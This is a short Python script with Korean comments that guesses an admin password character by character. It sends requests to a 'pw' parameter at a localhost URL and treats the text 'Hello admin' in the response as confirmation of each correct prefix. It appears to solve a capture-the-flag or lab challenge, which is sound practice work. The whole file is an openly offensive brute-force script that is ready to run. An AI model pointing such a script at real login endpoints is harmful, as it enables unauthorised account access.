import requests
import string

# 사용할 문자셋
chars = string.ascii_letters + string.digits

# 공격 대상 URL
url = 'http://localhost:8000/'

# 비밀번호 추측
passwd = ''
for i in range(8):  # 비밀번호 길이를 8로 가정
    for char in chars:
        test_password = passwd + char
        response = requests.get(url, params={'pw': test_password})

        # "Hello admin" 문구가 응답에 포함되면 비밀번호가 맞음
        if 'Hello admin' in response.text:
            passwd += char
            print(f"현재 비밀번호: {passwd}")
            break

print("비밀번호 찾음: " + passwd)
